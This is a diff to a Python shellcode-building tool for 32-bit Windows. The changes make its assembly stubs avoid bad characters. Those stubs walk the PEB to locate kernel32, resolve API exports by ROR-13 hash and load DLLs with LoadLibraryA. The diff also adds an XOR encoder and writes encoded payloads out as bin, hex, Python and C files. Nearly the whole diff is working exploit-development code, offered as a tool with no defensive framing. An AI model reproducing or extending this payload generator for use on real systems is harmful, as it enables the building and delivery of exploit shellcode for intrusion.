@@ -37,110 +37,159 @@ from Tools.strings import emit_push, to_dwords
 # past the stubs and reach `main`.
 # ---------------------------------------------------------------------------
 
-# Part 1: placed between `_start: jmp short _stub_trampoline` and the
-# trampoline label.  Estimated ~115 bytes — well within the 127-byte
-# reach of a short jump from `_start`.
-FRAMEWORK_STUBS_PART1 = """\
-get_first_ldr_entry:
-    xor ecx, ecx
-    mov eax, fs:[ecx + 0x30]
-    mov eax, [eax + 0x0c]
-    mov eax, [eax + 0x1c]
-    sub eax, 0x10
-    ret
+def _emit_framework_stubs_part1a(badchars: set[int]) -> str:
+    """Generate Part 1a stubs (PEB walk + kernel32 find) with badchar-safe encoding.
 
-find_kernel32_entry:
-    mov esi, [eax + 0x30]
-    cmp word ptr [esi], 0x004b
-    jne next
-    cmp word ptr [esi+2], 0x0045
-    jne next
-    cmp word ptr [esi+12], 0x0033
-    jne next
-    mov ebx, [eax + 0x18]
-    ret
+    Must fit within 127 bytes of a jmp short from _start.
+    """
+    from .encode import (
+        _disp_has_badchar, safe_mem_load, safe_sub_imm, safe_cmp_word,
+    )
+    lines: list[str] = []
 
-next:
-    mov eax, [eax + 0x10]
-    sub eax, 0x10
-    jmp find_kernel32_entry
+    # get_first_ldr_entry: PEB -> Ldr -> InInitializationOrderModuleList
+    lines.append("get_first_ldr_entry:")
+    lines.append("    xor ecx, ecx")
+    if not _disp_has_badchar(0x30, badchars):
+        lines.append("    mov eax, fs:[ecx + 0x30]")
+    else:
+        from .encode import encode_dword
+        lines.extend(encode_dword(0x30, badchars, "edx"))
+        lines.append("    add edx, ecx")
+        lines.append("    mov eax, fs:[edx]")
+    lines.extend(safe_mem_load("eax", "eax", 0x0c, badchars, tmp="edx"))
+    lines.extend(safe_mem_load("eax", "eax", 0x1c, badchars, tmp="edx"))
+    lines.extend(safe_sub_imm("eax", 0x10, badchars, tmp="edx"))
+    lines.append("    ret")
+    lines.append("")
 
-find_module:
-    call get_first_ldr_entry
-    jmp find_kernel32_entry
+    # find_kernel32_entry: walk InInitOrder looking for KERNEL32.DLL
+    lines.append("find_kernel32_entry:")
+    lines.extend(safe_mem_load("esi", "eax", 0x30, badchars, tmp="edx"))
+    lines.extend(safe_cmp_word("esi", 0, 0x004b, badchars, tmp="edx"))
+    lines.append("    jne next")
+    lines.extend(safe_cmp_word("esi", 2, 0x0045, badchars, tmp="edx"))
+    lines.append("    jne next")
+    lines.extend(safe_cmp_word("esi", 12, 0x0033, badchars, tmp="edx"))
+    lines.append("    jne next")
+    lines.extend(safe_mem_load("ebx", "eax", 0x18, badchars, tmp="edx"))
+    lines.append("    ret")
+    lines.append("")
 
-get_export_directory:
-    mov eax, [ebx+0x3c]
-    add eax, ebx
-    mov eax, [eax+0x78]
-    add eax, ebx
-    ret
+    # next: advance to next module in list
+    lines.append("next:")
+    lines.extend(safe_mem_load("eax", "eax", 0x10, badchars, tmp="edx"))
+    lines.extend(safe_sub_imm("eax", 0x10, badchars, tmp="edx"))
+    lines.append("    jmp find_kernel32_entry")
 
-get_export_tables:
-    mov ecx, [eax+0x18]
-    mov edi, [eax+0x20]
-    add edi, ebx
-    mov edx, [eax+0x24]
-    add edx, ebx
-    mov esi, [eax+0x1c]
-    add esi, ebx
-    ret
+    return "\n".join(lines)
 
-save_export_context:
-    mov [ebp-0x04], ebx
-    mov [ebp-0x08], edi
-    mov [ebp-0x0c], edx
-    mov [ebp-0x10], esi
-    mov [ebp-0x14], ecx
-    ret
-"""
 
-# Part 2: placed after `_stub_trampoline: jmp short main`.
-# Estimated ~65 bytes — within short-jump reach of `main`.
-FRAMEWORK_STUBS_PART2 = """\
-compute_hash:
-    xor eax, eax
-    xor edx, edx
-    cld
+def _emit_framework_stubs_part1b(badchars: set[int]) -> str:
+    """Generate Part 1b stubs (export directory/tables + save context).
 
-hash_loop:
-    lodsb
-    test al, al
-    jz hash_done
-    ror edx, 0x0d
-    movzx eax, al
-    add edx, eax
-    jmp hash_loop
+    Placed after the first trampoline. find_module calls back into Part 1a.
+    """
+    from .encode import safe_mem_load, safe_mem_store
+    lines: list[str] = []
 
-hash_done:
-    ret
+    # find_module: entry point
+    lines.append("find_module:")
+    lines.append("    call get_first_ldr_entry")
+    lines.append("    jmp find_kernel32_entry")
+    lines.append("")
 
-resolve_matched_export:
-    mov edx, [ebp - 0x0c]
-    movzx eax, word ptr [edx + ecx*2]
-    mov esi, [ebp - 0x10]
-    mov eax, [esi + eax*4]
-    add eax, [ebp - 0x04]
-    ret
+    # get_export_directory: PE header -> export directory RVA
+    lines.append("get_export_directory:")
+    lines.extend(safe_mem_load("eax", "ebx", 0x3c, badchars, tmp="edx"))
+    lines.append("    add eax, ebx")
+    lines.extend(safe_mem_load("eax", "eax", 0x78, badchars, tmp="edx"))
+    lines.append("    add eax, ebx")
+    lines.append("    ret")
+    lines.append("")
 
-resolve_export_by_hash:
-    mov [ebp-0x18], eax
-    xor ecx, ecx
+    # get_export_tables: extract NumberOfNames, AddressOfNames, etc.
+    lines.append("get_export_tables:")
+    lines.extend(safe_mem_load("ecx", "eax", 0x18, badchars, tmp="edx"))
+    lines.extend(safe_mem_load("edi", "eax", 0x20, badchars, tmp="edx"))
+    lines.append("    add edi, ebx")
+    lines.extend(safe_mem_load("edx", "eax", 0x24, badchars, tmp="ecx"))
+    lines.append("    add edx, ebx")
+    lines.extend(safe_mem_load("esi", "eax", 0x1c, badchars, tmp="ecx"))
+    lines.append("    add esi, ebx")
+    lines.append("    ret")
+    lines.append("")
 
-find_export_loop:
-    mov edi, [ebp - 0x08]
-    mov eax, [edi + ecx*4]
-    add eax, [ebp - 0x04]
-    mov esi, eax
-    call compute_hash
-    cmp edx, [ebp-0x18]
-    je resolve_matched_export
+    # save_export_context: store to stack frame (negative offsets from ebp)
+    lines.append("save_export_context:")
+    lines.extend(safe_mem_store("ebp", -0x04, "ebx", badchars, tmp="edx"))
+    lines.extend(safe_mem_store("ebp", -0x08, "edi", badchars, tmp="edx"))
+    lines.extend(safe_mem_store("ebp", -0x0c, "edx", badchars, tmp="ecx"))
+    lines.extend(safe_mem_store("ebp", -0x10, "esi", badchars, tmp="edx"))
+    lines.extend(safe_mem_store("ebp", -0x14, "ecx", badchars, tmp="edx"))
+    lines.append("    ret")
 
-inc_next:
-    inc ecx
-    cmp ecx, [ebp - 0x14]
-    jl find_export_loop
-"""
+    return "\n".join(lines)
+
+
+def _emit_framework_stubs_part2(badchars: set[int]) -> str:
+    """Generate Part 2 stubs (hash computation + export resolution) with badchar-safe encoding."""
+    from .encode import safe_mem_load, safe_mem_store, safe_ror_imm
+    lines: list[str] = []
+
+    # compute_hash: ROR-13 hash of null-terminated string at ESI
+    lines.append("compute_hash:")
+    lines.append("    xor eax, eax")
+    lines.append("    xor edx, edx")
+    lines.append("    cld")
+    lines.append("")
+    lines.append("hash_loop:")
+    lines.append("    lodsb")
+    lines.append("    test al, al")
+    lines.append("    jz hash_done")
+    lines.extend(safe_ror_imm("edx", 0x0d, badchars))
+    lines.append("    movzx eax, al")
+    lines.append("    add edx, eax")
+    lines.append("    jmp hash_loop")
+    lines.append("")
+    lines.append("hash_done:")
+    lines.append("    ret")
+    lines.append("")
+
+    # resolve_matched_export: ordinal -> function address
+    lines.append("resolve_matched_export:")
+    lines.extend(safe_mem_load("edx", "ebp", -0x0c, badchars, tmp="eax"))
+    lines.append("    movzx eax, word ptr [edx + ecx*2]")
+    lines.extend(safe_mem_load("esi", "ebp", -0x10, badchars, tmp="edx"))
+    lines.append("    mov eax, [esi + eax*4]")
+    lines.extend(safe_mem_load("ecx", "ebp", -0x04, badchars, tmp="edx"))
+    lines.append("    add eax, ecx")
+    lines.append("    ret")
+    lines.append("")
+
+    # resolve_export_by_hash: loop through exports comparing hashes
+    lines.append("resolve_export_by_hash:")
+    lines.extend(safe_mem_store("ebp", -0x18, "eax", badchars, tmp="ecx"))
+    lines.append("    xor ecx, ecx")
+    lines.append("")
+    lines.append("find_export_loop:")
+    lines.extend(safe_mem_load("edi", "ebp", -0x08, badchars, tmp="eax"))
+    lines.append("    mov eax, [edi + ecx*4]")
+    lines.extend(safe_mem_load("edi", "ebp", -0x04, badchars, tmp="esi"))
+    lines.append("    add eax, edi")
+    lines.append("    mov esi, eax")
+    lines.append("    call compute_hash")
+    lines.extend(safe_mem_load("eax", "ebp", -0x18, badchars, tmp="edi"))
+    lines.append("    cmp edx, eax")
+    lines.append("    je resolve_matched_export")
+    lines.append("")
+    lines.append("inc_next:")
+    lines.append("    inc ecx")
+    lines.extend(safe_mem_load("eax", "ebp", -0x14, badchars, tmp="edi"))
+    lines.append("    cmp ecx, eax")
+    lines.append("    jl find_export_loop")
+
+    return "\n".join(lines)
 
 
 # ---------------------------------------------------------------------------
@@ -162,6 +211,8 @@ class BuildResult:
     layout: StackLayout | None = None
     assembler: str | None = None
     asm_errors: list[str] | None = None
+    encoded_bytes: bytes | None = None
+    encoder_report: str | None = None
 
 
 # ---------------------------------------------------------------------------
@@ -169,29 +220,51 @@ class BuildResult:
 # ---------------------------------------------------------------------------
 
 
+def _emit_stack_reserve(badchars: set[int]) -> list[str]:
+    """Emit badchar-safe 'sub esp, 0x500' to reserve stack frame."""
+    from .encode import encode_byte
+    if 0x05 not in badchars:
+        return [
+            "    mov  ch, 0x05",
+            "    sub  esp, ecx",
+        ]
+    lines = encode_byte(0x05, badchars, "ch")
+    lines.append("    sub  esp, ecx")
+    return lines
+
+
 def _dll_load_block(dll: str, manifest: Manifest, layout: StackLayout) -> str:
     """Generate the LoadLibraryA block for a secondary DLL."""
+    from .encode import safe_add_imm, safe_call_mem, safe_mem_store, safe_mem_load
+
     module_slot = layout.slot(dll)
-    loadlib_slot = layout.slot("LoadLibraryA")
+    loadlib_off = -layout.slot("LoadLibraryA").offset
+    module_off = -module_slot.offset
 
     push_result = emit_push(dll, badchars=manifest.badchars)
     cleanup = len(to_dwords(dll)) * 4
+    bc = manifest.badchars
 
-    return "\n".join([
+    lines = [
         f"; ── Loading {dll} via LoadLibraryA ──────────────────────────────────",
         "",
         push_result.asm,
         f"    push esi                    ; lpLibFileName = &{dll}",
-        f"    call dword ptr {loadlib_slot.ebp_ref}",
-        f"    mov  {module_slot.ebp_ref}, eax    ; {dll} base",
-        f"    add  esp, 0x{cleanup:02x}           ; pop string from stack",
+        *safe_call_mem("ebp", loadlib_off, bc),
+        *safe_mem_store("ebp", module_off, "eax", bc),
+        f"    ; {dll} base",
+    ]
+    lines.extend(safe_add_imm("esp", cleanup, bc, tmp="ecx"))
+    lines.append("    ; pop string from stack")
+    lines += [
         "",
-        f"    mov  ebx, {module_slot.ebp_ref}",
+        *safe_mem_load("ebx", "ebp", module_off, bc),
         "    call get_export_directory",
         "    call get_export_tables",
         "    call save_export_context",
         "",
-    ])
+    ]
+    return "\n".join(lines)
 
 
 def _generate_test_harness(shellcode_len: int) -> str:
@@ -438,6 +511,23 @@ def _try_assemble_nasm(asm: str) -> tuple[bytes | None, str | None]:
         return None, f"nasm: {e}"
 
 
+def _check_badchars(raw: bytes, badchars: set[int]) -> list[str]:
+    """Scan assembled shellcode for badchar violations. Returns error messages."""
+    violations: list[str] = []
+    for i, byte in enumerate(raw):
+        if byte in badchars:
+            ctx_start = max(0, i - 2)
+            ctx_end = min(len(raw), i + 3)
+            ctx = raw[ctx_start:ctx_end].hex()
+            violations.append(
+                f"BADCHAR 0x{byte:02x} at offset {i} (context: {ctx})"
+            )
+    if violations:
+        summary = f"[!] {len(violations)} badchar violation(s) in {len(raw)} bytes"
+        return [summary] + violations
+    return []
+
+
 def _try_assemble(asm: str) -> tuple[bytes, str, list[str]] | tuple[None, None, list[str]]:
     """Try keystone, then nasm. Returns (bytes, assembler_name, errors) or (None, None, errors)."""
     errors: list[str] = []
@@ -638,22 +728,25 @@ def compose_asm(
         f"; Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
         "",
         "    _start:",
-        "        jmp short _stub_trampoline",
+        "        jmp short _stub_trampoline1",
         "",
         "; ── Framework Stubs ────────────────────────────────────────────────",
         "",
-        FRAMEWORK_STUBS_PART1,
-        "_stub_trampoline:",
+        _emit_framework_stubs_part1a(config.badchars),
+        "_stub_trampoline1:",
+        "    jmp short _stub_trampoline2",
+        "",
+        _emit_framework_stubs_part1b(config.badchars),
+        "_stub_trampoline2:",
         "    jmp short main",
         "",
-        FRAMEWORK_STUBS_PART2,
+        _emit_framework_stubs_part2(config.badchars),
         "; ── Main ───────────────────────────────────────────────────────────",
         "",
         "main:",
         "    mov  ebp, esp",
         "    xor  ecx, ecx",
-        "    mov  ch, 0x05",
-        "    sub  esp, ecx",
+        *_emit_stack_reserve(config.badchars),
         "",
         "    ; Bootstrap: find kernel32 via PEB walk",
         "    call find_module",
@@ -727,8 +820,18 @@ def build(
     config: TemplateConfig | None = None,
     out_dir: str = "emitter_out",
     assemble: bool = True,
+    encode: bool = False,
 ) -> BuildResult:
-    """Run the full build pipeline. Returns a BuildResult."""
+    """Run the full build pipeline. Returns a BuildResult.
+
+    When *encode* is True and the assembled payload contains badchar
+    violations, the XOR encoder is invoked automatically.  The raw
+    (unencoded) shellcode is still available in *shellcode_bytes*; the
+    encoded output goes into *encoded_bytes*.
+    """
+    from .scanner import scan
+    from .xor_encoder import xor_encode
+
     manifest = load_manifest(manifest_path)
     config = config or TemplateConfig()
     config.badchars = manifest.badchars   # manifest is authoritative
@@ -743,8 +846,26 @@ def build(
     raw: bytes | None = None
     assembler: str | None = None
     asm_errors: list[str] = []
+    encoded_bytes: bytes | None = None
+    encoder_report: str | None = None
+
     if assemble:
         raw, assembler, asm_errors = _try_assemble(asm)
+        if raw:
+            scan_result = scan(raw, config.badchars)
+            if not scan_result.clean:
+                if encode:
+                    enc = xor_encode(raw, config.badchars)
+                    encoder_report = enc.diagnostics
+                    if enc.success:
+                        encoded_bytes = enc.encoded
+                    else:
+                        asm_errors = (asm_errors or []) + [
+                            f"[!] Encoding failed: {enc.diagnostics}"
+                        ]
+                else:
+                    violations = _check_badchars(raw, config.badchars)
+                    asm_errors = (asm_errors or []) + violations
 
     contract_md = emit_full_contract_md(
         manifest, layout, template, config,
@@ -764,6 +885,8 @@ def build(
         layout=layout,
         assembler=assembler,
         asm_errors=asm_errors if asm_errors else None,
+        encoded_bytes=encoded_bytes,
+        encoder_report=encoder_report,
     )
 
 
@@ -785,6 +908,24 @@ def write_outputs(result: BuildResult, out_dir: str) -> None:
         (base / "bin" / "shellcode.c").write_text(result.c_array or "")
         if result.test_harness:
             (base / "bin" / "test_harness.py").write_text(result.test_harness)
+
+    if result.encoded_bytes:
+        (base / "bin").mkdir(parents=True, exist_ok=True)
+        (base / "bin" / "shellcode_encoded.bin").write_bytes(result.encoded_bytes)
+        (base / "bin" / "shellcode_encoded.hex").write_text(
+            _bytes_to_hex_str(result.encoded_bytes) or ""
+        )
+        (base / "bin" / "shellcode_encoded.py").write_text(
+            _bytes_to_py(result.encoded_bytes) or ""
+        )
+        (base / "bin" / "shellcode_encoded.c").write_text(
+            _bytes_to_c(result.encoded_bytes) or ""
+        )
+
+    if result.encoder_report:
+        (base / "Documentation" / "encoder_report.txt").write_text(
+            result.encoder_report
+        )
 
 
 # ---------------------------------------------------------------------------
@@ -808,6 +949,10 @@ def main() -> None:
     parser.add_argument("--src", default=None)
     parser.add_argument("--dst", default=None)
     parser.add_argument("--no-assemble", action="store_true")
+    parser.add_argument(
+        "--encode", action="store_true",
+        help="Apply XOR encoding when badchar violations are detected",
+    )
 
     args = parser.parse_args()
     config = TemplateConfig(
@@ -824,6 +969,7 @@ def main() -> None:
         config=config,
         out_dir=args.out,
         assemble=not args.no_assemble,
+        encode=args.encode,
     )
     write_outputs(result, args.out)
 
@@ -832,9 +978,17 @@ def main() -> None:
     print(f"[+] Contract:  {args.out}/Documentation/contract.md")
     if result.shellcode_bytes:
         print(f"[+] Assembler: {result.assembler}")
-        print(f"[+] Shellcode: {len(result.shellcode_bytes)} bytes")
+        print(f"[+] Shellcode: {len(result.shellcode_bytes)} bytes (raw)")
         print(f"[+] Hex:       {args.out}/bin/shellcode.{{bin,hex,py,c}}")
         print(f"[+] Harness:   {args.out}/bin/test_harness.py")
+        if result.encoded_bytes:
+            print(f"[+] Encoded:   {len(result.encoded_bytes)} bytes (XOR)")
+            print(f"[+] Encoded:   {args.out}/bin/shellcode_encoded.{{bin,hex,py,c}}")
+        if result.encoder_report:
+            print(f"[+] Report:    {args.out}/Documentation/encoder_report.txt")
+        if result.asm_errors:
+            for err in result.asm_errors:
+                print(f"    {err}", file=sys.stderr)
     else:
         if result.asm_errors:
             print("[!] Assembly failed:")
